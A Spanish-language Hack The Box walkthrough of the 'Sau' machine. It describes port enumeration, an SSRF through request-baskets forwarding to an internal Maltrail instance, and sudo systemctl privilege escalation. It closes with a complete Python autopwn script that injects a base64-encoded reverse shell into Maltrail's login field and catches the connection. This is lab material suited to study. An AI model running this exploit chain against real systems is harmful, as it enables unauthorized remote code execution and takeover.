---
title: Sau
layout: page
permalink: /HTB_Sau
---

<h2 class="amarillo">Sau</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/Sau/sau.png" alt="under" oncontextmenu="return false;">
</div>


Encendemos la maquina Sau y nos da la direccion IP 10.129.229.26, probamos a lanzarle 5 trazas ICMP y de paso mirar el TLL para identificar si estamos frente a una maquina Linux o Windows

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/1.png" alt="under" oncontextmenu="return false;">
</div>

En base al TTL vemos un valor de 63 por tanto estamos frente a una maquina Linux

# Enumeracion

Comenzamos enumerando los puertos que esten abiertos para la maquina utilizando nmap

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.229.26
```

Y vemos que la maquina tiene los puertos 22 y 55555
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/2.png" alt="under" oncontextmenu="return false;">
</div>

Probamos a analizar con nmap con una serie de scripts basicos de reconocimiento y identificando la version y servicio que corren para cada uno de estos puertos
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/3.png" alt="under" oncontextmenu="return false;">
</div>


Vemos que el puerto 55555 presenta un servicio http entonces intentamos enumerarlo con whatweb pero no encontramos informacion relevante
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/4.png" alt="under" oncontextmenu="return false;">
</div>


Seguido abrimos la pagina desde el navegador
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/5.png" alt="under" oncontextmenu="return false;">
</div>


Y vemos que tenemos la capacidad de crear baskets, y mirando el codigo fuente de la pagina vemos que la pagina se comunica con un /api/baskets

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/6.png" alt="under" oncontextmenu="return false;">
</div>



Pero antes seguimos con la creacion del basket para obtener el token
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/7.png" alt="under" oncontextmenu="return false;">
</div>



La pagina nos pide enviar requests HTTP al basket
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/8.png" alt="under" oncontextmenu="return false;">
</div>


Si le mandamos una peticion GET tendremos un codigo de estado exitoso
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/9.png" alt="under" oncontextmenu="return false;">
</div>

Y en la web podremos ver la informacion de la peticion

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/10.png" alt="under" oncontextmenu="return false;">
</div>


aqui el vector de ataca esta en que la pagina permite que nuestros baskets tengan un redirect de tipo forwarding del cual podremos aprovecharnos para crear un script

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/10.5.png" alt="under" oncontextmenu="return false;">
</div>


Este es un exploit que traimos de Github buscando vulnerabilidades asociadas a los baskets y como nos permite crear un Forwarding, hacemos que el basket apunte a nuestra direccion IP

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/11.png" alt="under" oncontextmenu="return false;">
</div>


Aprovechandonos del Forwarding en los Baskets para enumerar contenido interno de la maquina vemos que cambiar el forwarding al puerto 80 interno me permite ver el contenido del puerto filtrado 80:
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/12.png" alt="under" oncontextmenu="return false;">
</div>


Pero mas alla de poder listar contenido la idea es conseguir una consola interactiva
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/12.5.png" alt="under" oncontextmenu="return false;">
</div>


Ejecutando el script obtendremos la reverse shell y estaremos dentro de la maquina
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/13.png" alt="under" oncontextmenu="return false;">
</div>


Enumerando un poco el sistema encontraremos archivos de configuracion
# Escalada


Mirando los privilegios que podamos tener asignados a nivel de sudoers vemos que podemos ejecutar systemctl

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/15.png" alt="under" oncontextmenu="return false;">
</div>


Vemos que estamos frente a una version vulnerable de systemctl ya que podemos ejecutar la instruccion `!sh` para conseguir una consola interactiva
<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/16.png" alt="under" oncontextmenu="return false;">
</div>

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/pwn.png" alt="under" oncontextmenu="return false;">
</div>


De paso compartir el script autopwn

<div style="text-align: center;">
  <img src="/assets/images/HTB/Sau/script.png" alt="under" oncontextmenu="return false;">
</div>


```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd
import sys
import signal
from termcolor import colored
import argparse
import random
import string
import threading
from pwn import *
import subprocess
import requests
import base64


# Ctrl_C
def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(
        description=colored("AutoPwn Sau", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://10.129.229.26)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


# Variables Globales
request_basket_port = 55555
api_url = "/api/baskets/"


def createBasket(URL):
    p1 = log.progress("Creating Basket")
    p1.status("Loading")

    global basket_name
    basket_name = ''.join(random.choices(string.ascii_lowercase, k=6))

    payload = {"forward_url": "http://localhost", "proxy_response": True,
               "insecure_tls": False, "expand_path": True, "capacity": 250}

    p1.status(payload)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = f"{URL}:{request_basket_port}{api_url}{basket_name}"

    try:
        r = requests.post(full_url, headers=headers, json=payload, timeout=5)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    if r.status_code == 201:
        p1.status("Succesfully uploaded payload!!")
        print(colored(f"[+] Basket created - {basket_name}", "green"))
    else:
        print(colored("\n\n[!] FATAL: Could not properly request %s. Is the server online?" %
              full_url, "red"))
        sys.exit(1)


def maltrailExploit(url, IP, PORT):
    target_url = url+'/login'
    p2 = log.progress(colored("Exploiting Maltrail 0.5.3", "red"))

    reverse = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'' % (
        IP, PORT)
    reverse_base64 = base64.b64encode(reverse.encode()).decode()
    command = f"curl '{target_url}' --data 'username=;`echo+\"{reverse_base64}\"+|+base64+-d+|+sh`'"
    os.system(command)


def main():
    URL, IP, PORT = get_arguments()
    createBasket(URL)

    basket_url = URL+':'+str(request_basket_port)+'/'+basket_name
    try:
        threading.Thread(target=maltrailExploit,
                         args=(basket_url, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```
